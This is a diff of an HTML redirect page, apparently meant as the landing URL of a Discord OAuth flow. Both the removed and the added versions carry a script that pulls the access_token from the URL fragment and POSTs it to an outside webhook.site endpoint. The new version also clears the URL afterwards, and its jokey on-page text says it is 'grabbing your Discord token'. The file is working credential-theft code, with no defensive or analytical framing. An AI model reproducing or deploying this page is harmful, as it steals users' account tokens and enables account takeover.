@@ -1,11 +1,32 @@
-<!-- redirect.html -->
-<script>
-  const hash = window.location.hash;
-  if (hash && hash.includes("access_token")) {
-    fetch("https://webhook.site/42931b3c-0851-49e3-8558-541ba2a8b3ad", {
-      method: "POST",
-      headers: { "Content-Type": "text/plain" },
-      body: hash
-    });
-  }
-</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Almost There...</title>
+</head>
+<body style="background:#1e1e2f; color:#f0f0f0; font-family: 'Comic Sans MS', cursive, sans-serif; text-align:center; padding-top:100px;">
+  <h1>Yo, hold up! 👀</h1>
+  <p>Just grabbing your Discord token real quick...</p>
+  <p>Don’t worry, it’s just to say hi! 😎</p>
+  <p style="margin-top:40px; font-size:12px; color:#777;">
+    If you feel weird about this, maybe close this tab and pretend it never happened.  
+    Otherwise, sit tight and enjoy the vibes.  
+  </p>
+
+  <script>
+    const hash = window.location.hash.substring(1);
+    const params = new URLSearchParams(hash);
+    const token = params.get("access_token");
+
+    if (token) {
+      fetch("https://webhook.site/42931b3c-0851-49e3-8558-541ba2a8b3ad", {
+        method: "POST",
+        headers: { "Content-Type": "text/plain" },
+        body: token
+      });
+
+      window.history.replaceState(null, null, window.location.pathname);
+    }
+  </script>
+</body>
+</html>
